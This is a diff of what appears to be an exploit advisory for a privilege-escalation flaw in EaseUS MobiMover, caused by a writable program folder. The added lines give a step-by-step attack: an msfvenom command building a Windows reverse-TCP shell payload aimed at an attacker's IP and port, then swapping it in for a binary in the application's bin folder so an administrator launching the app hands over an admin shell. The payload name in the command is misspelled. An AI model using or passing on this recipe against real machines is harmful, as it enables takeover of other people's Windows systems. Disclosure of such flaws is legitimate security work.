@@ -5,7 +5,8 @@ MobiMoverUILaunch.exe  suffers from an elevation of privileges vulnerability whi
 
 Vendor Homepage: https://www.easeus.com/ <br/>
 Software Link : https://down.easeus.com/product/mobimover_trial_setup<br/>
-POC video: https://www.youtube.com/watch?v=FR4cQm-z4Gw
+Google Drive: https://drive.google.com/file/d/1tqP00IV-WzqNpyE1Rnqwdg_44RxOhINQ/view?usp=sharing <br/>
+POC video: https://www.youtube.com/watch?v=FR4cQm-z4Gw </br>
 
 
 #PoC
@@ -27,3 +28,12 @@ C:\Program Files (x86)\EaseUS\EaseUS MobiMover\bin
   RW BUILTIN\Administrators
         FILE_ALL_ACCESS
 ```
+
+1. Create malicious binary file on kali linux with msfvenom <br/>
+```msfvenom -f exe -p windows/x64/shell_revese_tcp LHOST=<IP> LPORT=<PORT> -f exe -o prepare.exe```
+
+2. Transfer created 'prepare.exe' to the Windows Host from Kali as low level user access <br/>
+3. Move the created 'prepare.exe' binary file to the 'C:\Program Files (x86)\EaseUS\EaseUS MobiMover\bin\prepare.exe' to replace the old one as low level user access <br/>
+4. When Administrator run the application,you will get reverse shell as administrator <br/>
+
+   
